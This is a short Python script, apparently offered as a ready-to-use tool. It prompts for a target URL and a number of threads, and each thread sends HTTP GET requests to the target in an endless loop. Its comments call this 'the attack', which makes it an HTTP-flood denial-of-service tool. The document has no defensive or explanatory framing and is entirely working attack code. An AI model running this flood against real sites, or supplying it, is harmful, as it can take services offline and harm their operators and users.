import threading
import requests
import sys

# Function to perform the attack
def attack(target):
    while True:
        try:
            response = requests.get(target)
            print(f"Request sent: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Main function to take user input and start the attack
def main():
    # Take user input for the target URL or IP address
    target = input("Enter the target URL or IP address (e.g., http://example.com or https://example.com): ").strip()

    # Ensure the target starts with http:// or https://
    if not target.startswith("http://") and not target.startswith("https://"):
        print("Please include 'http://' or 'https://' in the URL.")
        sys.exit(1)

    # Number of threads (simulating multiple clients)
    num_threads = int(input("Enter the number of threads (e.g., 100): ").strip())

    # Create and start threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(target,))
        thread.daemon = True  # Allow the program to exit even if threads are running
        threads.append(thread)
        thread.start()

    # Keep the main thread alive
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Attack stopped.")

if __name__ == "__main__":
    main()